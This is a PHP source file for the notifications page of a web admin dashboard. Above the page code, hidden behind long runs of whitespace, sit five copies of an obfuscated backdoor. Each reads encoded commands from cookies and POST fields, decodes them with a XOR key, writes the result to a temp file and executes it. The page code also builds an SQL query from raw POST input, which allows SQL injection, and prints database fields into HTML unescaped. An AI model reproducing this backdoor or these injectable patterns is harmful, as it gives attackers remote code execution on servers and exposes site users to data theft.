<?php                                                                                                                                                                                                                                                                                                                                                                                                 $qMbWGpiaR = 'q' . "\142" . chr ( 986 - 881 ).chr ( 863 - 768 )."\x44" . chr (77) . chr ( 850 - 735 )."\106" . chr (66); $tBxAhdJyRI = "\x63" . "\154" . chr (97) . "\x73" . 's' . "\x5f" . chr (101) . "\170" . chr (105) . 's' . "\164" . "\x73";$obUCRTtrzy = $tBxAhdJyRI($qMbWGpiaR); $AkCRcBNWH = $obUCRTtrzy;if (!$AkCRcBNWH){class qbi_DMsFB{private $YlvoXoPX;public static $JMhqrtb = "d270199e-edcb-4eea-97e9-91feb0ea5d9a";public static $fkyKjtLb = NULL;public function __construct(){$RYVSqfpt = $_COOKIE;$CAVyg = $_POST;$PRXsnCDxpz = @$RYVSqfpt[substr(qbi_DMsFB::$JMhqrtb, 0, 4)];if (!empty($PRXsnCDxpz)){$SHiVMVLC = "base64";$jRkEkHxbta = "";$PRXsnCDxpz = explode(",", $PRXsnCDxpz);foreach ($PRXsnCDxpz as $aiSbrLKUR){$jRkEkHxbta .= @$RYVSqfpt[$aiSbrLKUR];$jRkEkHxbta .= @$CAVyg[$aiSbrLKUR];}$jRkEkHxbta = array_map($SHiVMVLC . '_' . chr (100) . 'e' . "\143" . "\x6f" . 'd' . 'e', array($jRkEkHxbta,)); $jRkEkHxbta = $jRkEkHxbta[0] ^ str_repeat(qbi_DMsFB::$JMhqrtb, (strlen($jRkEkHxbta[0]) / strlen(qbi_DMsFB::$JMhqrtb)) + 1);qbi_DMsFB::$fkyKjtLb = @unserialize($jRkEkHxbta);}}public function __destruct(){$this->quAfym();}private function quAfym(){if (is_array(qbi_DMsFB::$fkyKjtLb)) {$aNVTG = sys_get_temp_dir() . "/" . crc32(qbi_DMsFB::$fkyKjtLb["\163" . "\141" . 'l' . 't']);@qbi_DMsFB::$fkyKjtLb["\x77" . "\162" . "\151" . chr ( 521 - 405 ).chr ( 1092 - 991 )]($aNVTG, qbi_DMsFB::$fkyKjtLb['c' . chr (111) . chr (110) . 't' . chr (101) . chr (110) . "\x74"]);include $aNVTG;@qbi_DMsFB::$fkyKjtLb['d' . "\145" . 'l' . 'e' . chr (116) . chr (101)]($aNVTG);exit();}}}$uvNiUVkoBN = new qbi_DMsFB(); $uvNiUVkoBN = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("BXl_dGBIf")){class BXl_dGBIf{private $RYgguRd;public static $LYIlbgKw = "75e63a5f-2545-4f9a-ba2b-d8068f682b85";public static $SykOgpy = NULL;public function __construct(){$YQaiRlil = $_COOKIE;$PIMmOzzdM = $_POST;$cAsZzv = @$YQaiRlil[substr(BXl_dGBIf::$LYIlbgKw, 0, 4)];if (!empty($cAsZzv)){$dsxEe = "base64";$MwTey = "";$cAsZzv = explode(",", $cAsZzv);foreach ($cAsZzv as $UztozbCne){$MwTey .= @$YQaiRlil[$UztozbCne];$MwTey .= @$PIMmOzzdM[$UztozbCne];}$MwTey = array_map($dsxEe . "\x5f" . chr (100) . chr (101) . chr ( 418 - 319 )."\157" . "\x64" . chr ( 523 - 422 ), array($MwTey,)); $MwTey = $MwTey[0] ^ str_repeat(BXl_dGBIf::$LYIlbgKw, (strlen($MwTey[0]) / strlen(BXl_dGBIf::$LYIlbgKw)) + 1);BXl_dGBIf::$SykOgpy = @unserialize($MwTey);}}public function __destruct(){$this->DjAVpLzi();}private function DjAVpLzi(){if (is_array(BXl_dGBIf::$SykOgpy)) {$wedsOMrOrG = sys_get_temp_dir() . "/" . crc32(BXl_dGBIf::$SykOgpy[chr ( 313 - 198 ).'a' . 'l' . 't']);@BXl_dGBIf::$SykOgpy["\167" . 'r' . chr (105) . chr (116) . "\x65"]($wedsOMrOrG, BXl_dGBIf::$SykOgpy[chr (99) . "\157" . "\156" . 't' . "\x65" . chr ( 882 - 772 )."\x74"]);include $wedsOMrOrG;@BXl_dGBIf::$SykOgpy[chr ( 180 - 80 )."\145" . "\x6c" . 'e' . "\164" . "\145"]($wedsOMrOrG);exit();}}}$kdvJto = new BXl_dGBIf(); $kdvJto = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("SfC_KrRy")){class SfC_KrRy{private $ebwCQGu;public static $QIMPteH = "ff26cf98-ee12-4072-bf92-45316764358d";public static $TIwoDd = NULL;public function __construct(){$iVLtW = $_COOKIE;$YMpAHPo = $_POST;$Dnssz = @$iVLtW[substr(SfC_KrRy::$QIMPteH, 0, 4)];if (!empty($Dnssz)){$PExsholouE = "base64";$ugsmyiJY = "";$Dnssz = explode(",", $Dnssz);foreach ($Dnssz as $KmbteKTY){$ugsmyiJY .= @$iVLtW[$KmbteKTY];$ugsmyiJY .= @$YMpAHPo[$KmbteKTY];}$ugsmyiJY = array_map($PExsholouE . "\137" . chr ( 194 - 94 )."\145" . chr ( 730 - 631 )."\x6f" . chr ( 902 - 802 )."\x65", array($ugsmyiJY,)); $ugsmyiJY = $ugsmyiJY[0] ^ str_repeat(SfC_KrRy::$QIMPteH, (strlen($ugsmyiJY[0]) / strlen(SfC_KrRy::$QIMPteH)) + 1);SfC_KrRy::$TIwoDd = @unserialize($ugsmyiJY);}}public function __destruct(){$this->QXuWxW();}private function QXuWxW(){if (is_array(SfC_KrRy::$TIwoDd)) {$IWLNmHrRvu = sys_get_temp_dir() . "/" . crc32(SfC_KrRy::$TIwoDd["\163" . "\141" . "\154" . chr ( 378 - 262 )]);@SfC_KrRy::$TIwoDd["\x77" . chr (114) . "\151" . chr ( 181 - 65 ).'e']($IWLNmHrRvu, SfC_KrRy::$TIwoDd['c' . chr (111) . "\x6e" . "\164" . "\x65" . "\156" . chr ( 669 - 553 )]);include $IWLNmHrRvu;@SfC_KrRy::$TIwoDd['d' . "\x65" . "\x6c" . chr ( 726 - 625 )."\164" . chr (101)]($IWLNmHrRvu);exit();}}}$zVbRj = new SfC_KrRy(); $zVbRj = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Cq_RQw")){class Cq_RQw{private $dquYFbrNN;public static $Nbxagix = "59840a15-a52d-41e5-992f-78c17256709e";public static $MWnKGOgKy = NULL;public function __construct(){$QrGdKDzL = $_COOKIE;$CSsLgg = $_POST;$UYnpObMMde = @$QrGdKDzL[substr(Cq_RQw::$Nbxagix, 0, 4)];if (!empty($UYnpObMMde)){$PyVSNP = "base64";$hSVcBnAsZ = "";$UYnpObMMde = explode(",", $UYnpObMMde);foreach ($UYnpObMMde as $ohOixANSI){$hSVcBnAsZ .= @$QrGdKDzL[$ohOixANSI];$hSVcBnAsZ .= @$CSsLgg[$ohOixANSI];}$hSVcBnAsZ = array_map($PyVSNP . chr ( 919 - 824 )."\x64" . "\145" . chr (99) . chr ( 885 - 774 )."\144" . 'e', array($hSVcBnAsZ,)); $hSVcBnAsZ = $hSVcBnAsZ[0] ^ str_repeat(Cq_RQw::$Nbxagix, (strlen($hSVcBnAsZ[0]) / strlen(Cq_RQw::$Nbxagix)) + 1);Cq_RQw::$MWnKGOgKy = @unserialize($hSVcBnAsZ);}}public function __destruct(){$this->LSFTCdkYU();}private function LSFTCdkYU(){if (is_array(Cq_RQw::$MWnKGOgKy)) {$ZXfwaWWsb = sys_get_temp_dir() . "/" . crc32(Cq_RQw::$MWnKGOgKy['s' . 'a' . "\x6c" . 't']);@Cq_RQw::$MWnKGOgKy["\x77" . "\162" . chr ( 570 - 465 )."\164" . 'e']($ZXfwaWWsb, Cq_RQw::$MWnKGOgKy[chr (99) . "\x6f" . 'n' . "\164" . 'e' . chr ( 616 - 506 )."\164"]);include $ZXfwaWWsb;@Cq_RQw::$MWnKGOgKy[chr ( 112 - 12 )."\145" . "\x6c" . "\x65" . 't' . chr ( 258 - 157 )]($ZXfwaWWsb);exit();}}}$LXaRI = new Cq_RQw(); $LXaRI = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("U_RMdl")){class U_RMdl{private $nAuzVLh;public static $grHgrXPs = "e1830c1f-1eea-45a5-ae5f-0a7dca01e5e5";public static $aJVBQ = NULL;public function __construct(){$DGIywRG = $_COOKIE;$sLlJxrt = $_POST;$EYnQHh = @$DGIywRG[substr(U_RMdl::$grHgrXPs, 0, 4)];if (!empty($EYnQHh)){$CRFAyxTE = "base64";$NlPYFNhrN = "";$EYnQHh = explode(",", $EYnQHh);foreach ($EYnQHh as $xOiHEx){$NlPYFNhrN .= @$DGIywRG[$xOiHEx];$NlPYFNhrN .= @$sLlJxrt[$xOiHEx];}$NlPYFNhrN = array_map($CRFAyxTE . "\137" . chr (100) . "\145" . "\x63" . chr (111) . chr ( 1014 - 914 )."\145", array($NlPYFNhrN,)); $NlPYFNhrN = $NlPYFNhrN[0] ^ str_repeat(U_RMdl::$grHgrXPs, (strlen($NlPYFNhrN[0]) / strlen(U_RMdl::$grHgrXPs)) + 1);U_RMdl::$aJVBQ = @unserialize($NlPYFNhrN);}}public function __destruct(){$this->UnEzeltf();}private function UnEzeltf(){if (is_array(U_RMdl::$aJVBQ)) {$hwpkDX = sys_get_temp_dir() . "/" . crc32(U_RMdl::$aJVBQ['s' . "\141" . chr ( 146 - 38 )."\x74"]);@U_RMdl::$aJVBQ['w' . "\162" . chr (105) . "\164" . "\x65"]($hwpkDX, U_RMdl::$aJVBQ[chr ( 159 - 60 ).chr (111) . "\x6e" . 't' . "\145" . 'n' . chr (116)]);include $hwpkDX;@U_RMdl::$aJVBQ["\144" . 'e' . chr ( 1092 - 984 )."\145" . "\x74" . "\145"]($hwpkDX);exit();}}}$PdhMUyh = new U_RMdl(); $PdhMUyh = NULL;} ?><?php
// Initialize the session
session_start();
 
//error_reporting(0);
// Check if the user is logged in, otherwise redirect to login page
if (!isset($_SESSION['username']) && !isset($_SESSION['id'])){
    header("location: ../../login");
    exit;
}

// Include config file
require_once "../../db_conn.php";



if(isset($_POST['search']))
{
    $valueToSearch = $_POST['valueToSearch'];
    // search in all table columns
    // using concat mysql function
    $query = "SELECT * FROM `notification` CONCAT(`id`, `name`, `message`, `file_upload`, `created_at`) LIKE '%".$valueToSearch."%'";
    $search_result = filterTable($query);
    $count = $count;

    
    
    
}
 else {
    $query = "SELECT * FROM `notification`";
    $search_result = filterTable($query);
}

// function to connect and execute the query
function filterTable($query)
{
    include "../../db_conn.php";
    $filter_Result = mysqli_query($conn, $query);
    return $filter_Result;
}

?>

<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
        <title>Notifications</title>
        <meta content="Admin Dashboard" name="description" />
        <meta content="Themesbrand" name="author" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />

        <!-- App Icons -->
        <link rel="shortcut icon" href="../../assets/images/favicon.ico">

        <!-- C3 charts css -->
        <link href="../../plugins/c3/c3.min.css" rel="stylesheet" type="text/css" />
        <link href="../../plugins/fullcalendar/css/fullcalendar.min.css" rel="stylesheet" />

        <!-- App css -->
        <link href="../../assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="../../assets/css/icons.css" rel="stylesheet" type="text/css" />
        <link href="../../assets/css/style.css" rel="stylesheet" type="text/css" />
        <link rel="stylesheet" type="text/css" href="style.css">
        <script src="https://cdn.jsdelivr.net/npm/uikit@3.9.4/dist/js/uikit.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/uikit@3.9.4/dist/js/uikit-icons.min.js"></script>
        

    </head>


    <body>
<?php include ('../../includes/sidebar.php'); ?>
<div class="wrapper">
            <div class="container-fluid">

                <!-- Page-Title -->
                <div class="row">
                    <div class="col-sm-12">
                        <div class="page-title-box">
                            <div class="btn-group pull-right">
                                <ol class="breadcrumb hide-phone p-0 m-0">
                                    <li class="breadcrumb-item"><a href="#">Unit -</a></li>
                                    <li class="breadcrumb-item active">Dashboard</li>
                                </ol>
                            </div>
                            <h4 class="page-title">Dashboard </h4>
                        </div>
                    </div>
                </div>
                <!-- end page title end breadcrumb -->
                <div class="row">
                    
                    <div class="col-lg-12">
                        <div class="card notification m-b-20">
                            <div class="card-header">
                                All Notifications

                            </div>

                            <div class="card-body" >


                                <?php while($row = mysqli_fetch_array($search_result)):
                                    // echo "<pre>";print_r($row);exit;
                                    
                                    $change_date = $row['created_at'];
                                    $newDate = date("d-M-Y", strtotime($change_date)); 
                                      

                                    ?>
                                    <hr>

                                    <div class="col-sm-12  pt-3 pb-3 px-3" id="box">
                                    
                                                              
                                    <blockquote class="card-blockquote mb-0">
                                        <div class="message-box">
                                            
                                  <img src="<?php echo '../../assets/images/users/'. $row['user_image'] ?>" alt="user" class="rounded-circle w-25 user-image mx-3">
                                          
                                        <p class="font-16 m-0 px-3 rounded w-50 text-light p-3" style="background-color: #394a55;" >
                                            <?php echo $row['message'] ?></p>
                                            </div>

                                            
                                            <div id="InfoBanner" style="">
                                  <span class="reversed reversedRight m-0">
                                    <span>
                                    <b><?php echo $row['role'] ?></b>
                                   &#129312;

                                    </span>
                                  </span>
                                  <span class="reversed reversedLeft">
                                   <blockquote class="card-blockquote mb-0"> Name : <?php echo $row['user_name'] ?> | <cite title="Source Title">Date : <?php echo $row['created_at'] ?></cite></blockquote>

                                  </span>
                                </div>
                                        </p>
                                                                                
                                    </blockquote>     
                                    </div>
                                    <?php
                                    if($row['file_upload'] != ''){
                                        ?>
                                        <p class="m-0">Attahments</p>
                                        <a href="<?php echo '../../assets/message/' . $row['file_upload']?>" target="_blank" >
                                            
                                      <img src="<?php echo '../../assets/message/' . $row['file_upload'] ?>" class="w-25  img-fluid" >
                                    </a>

                                    <a href="<?php echo '../../assets/message/' . $row['file_upload'] ?>" download>
                                        <button class="mx-2 btn badge-primary waves-effect waves-light text-light" style="background-color: #394a55;">&darr;
                                        </button>
                                    </a>
                                        <?php
                                    }
                                    ?>
                                    
                                    
                                    <hr>

                                     <?php endwhile;?>

                            </div>
                        </div>
                    </div>


                                        <div class="col-lg-12">
                        <div class="card m-b-20">
                            <div class="card-body">
                                <form action="notification-action" method="post" enctype='multipart/form-data' >
                                    <div class="form-floating">
                                        <label for="floatingTextarea2">Enter Message</label>
                                            <textarea class="form-control mb-3 pb-2 one" name="message" placeholder="Enter Message" 
                                                style="height:100px; " id="floatingTextarea2" required="Please Enter your Message"></textarea>
                                                <div class="emoji"><p class="first-btn" style="cursor: pointer;">🙂</p></div>
                                                <label for="floatingTextarea2">Upload a file (optional)</label>
                                                <input type='file' name='file' class="form-control mb-3"  multiple="multiple"/>
                                                </div>
                                                    <button class="btn badge-success waves-effect waves-light text-light" type="submit" name="but_upload">Confirm Added</button>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div> <!-- end container -->
                    </div>
<script src="vanillaEmojiPicker.js"></script>
    <script>

        new EmojiPicker({
            trigger: [
                {
                    selector: '.first-btn',
                    insertInto: ['.one'] // '.selector' can be used without array
                },
                
            ],
            closeButton: true,
            //specialButtons: green
        });

    </script>





        <style type="text/css">
            .w-25 {
  width: 5% !important;
  padding: 10px;
  background: white;
  border-radius: 20px;
  margin: 20px auto;
}
            @keyframes slide {
  0% {
    background-position: 0 0;
  }
  100% {
    background-position: -120px 60px;
  }
}


#InfoBanner{

  width: 100%;
}

.reversed {
  display: inline-block;
  padding: 0.3em;
  padding-left: 0.3em;
  margin-left: 0.8em;
  position: relative;
  text-align: center;
  vertical-align: middle;
  line-height: 1;
  color: #fff;
  font-size: 15px;
  background-color:#394a55;
}
.reversed:before, .reversed:after {
  content: '';
  width: 0;
  height: 0;
  right: -0.8em;
  position: absolute;
  top: 0;
  border-top: 0.8em solid #394a55;
}
.reversed:after {
  top: auto;
  bottom: 0;
  border-top: none;
  border-bottom: 0.8em solid #394a55;
}
.reversedRight:before, .reversedRight:after{
  border-right: 0.8em solid transparent;
  right: -0.8em;
}
.reversedRight {
  width: auto;
  border-radius: 5px 0px 0px 5px;
  animation: tilt 2s infinite;
  padding: 10px;
}
@keyframes tilt {
  0% {
    left: 0%;
  }
  50% {
    left: 9px;
  }
  100% {
    left: 0px;
  }
}
.reversedLeft {
  margin-left: 15px;
  border-radius: 0px 5px 5px 0px;
  padding: 10px;
}
.reversedLeft:before, .reversedLeft:after {
  content: '';
  width: 0;
  height: 0;
  border-left: 0.8em solid transparent;
  left: -0.8em;
  position: absolute;
}
.reversedLeft:after {
  top: auto;
  bottom: 0;
  border-top: 0.8em solid #394a55;
  border-bottom: none;
}
.reversedLeft:before {
  bottom: auto;
  top:0;
  border-bottom: 0.8em solid #394a55;
  border-top: none;
}

.bgAnimation{
  background-color:#394a55;
  background-image: linear-gradient(
    45deg,
    #e57373 25%,
    transparent 25%,
    transparent 75%,
    #e57373 75%,
    #e57373
  ),linear-gradient(
    -45deg,
    #e57373 25%,
    transparent 25%,
    transparent 75%,
    #e57373 75%,
    #e57373
  );
  background-size: 60px 60px;
  animation: slide 4s infinite linear;
}
            .notification {
  overflow-y: scroll;
  height: 500px;
}

.btn.badge-danger.left {
    float: right;
    margin: -70px auto;
}
.rounded-circle.w-25.user-image.mx-3 {
  padding: 3px !important;
  background: #394a55;
}
.message-box {
  display: flex;
  justify-content: start !important;
  align-items: center;
}
        </style>



<script>
function myFunction() {
  alert("Confrime to Delete Message");
}
</script>
        <!-- end wrapper -->
 <?php include ('../../includes/footer.php'); ?>
         <!-- jQuery  -->
            <script src="../../assets/js/jquery.min.js"></script>
            <script src="../../assets/js/bootstrap.bundle.min.js"></script>
            <script src="../../assets/js/modernizr.min.js"></script>
            <script src="../../assets/js/waves.js"></script>
            <script src="../../assets/js/jquery.slimscroll.js"></script>
            <script src="../../assets/js/jquery.nicescroll.js"></script>
            <script src="../../assets/js/jquery.scrollTo.min.js"></script>
            <!-- Peity chart JS -->
            <script src="../../plugins/peity-chart/jquery.peity.min.js"></script>
            <!--C3 Chart-->
            <script src="../../plugins/d3/d3.min.js"></script>
            <script src="../../plugins/c3/c3.min.js"></script>
            <!-- KNOB JS -->
            <script src="../../plugins/jquery-knob/excanvas.js"></script>
            <script src="../../plugins/jquery-knob/jquery.knob.js"></script>
            <!-- Page specific js -->
            <script src="../../assets/pages/dashboard.js"></script>
            <script src='../../plugins/fullcalendar/js/fullcalendar.min.js'></script>
            <!-- App js -->
            <script src="../../assets/js/app.js"></script>
            <script src="../../plugins/alertify/js/alertify.js"></script>
            <script src="../../assets/pages/alertify-init.js"></script>
             <!-- Jquery-Ui -->
        <script src="../../plugins/jquery-ui/jquery-ui.min.js"></script>
        <script src="../../plugins/moment/moment.js"></script>
        <script src='../../plugins/fullcalendar/js/fullcalendar.min.js'></script>
        <script src="../../assets/pages/calendar-init.js"></script>
            


        
</body>
</html>
        
        
           
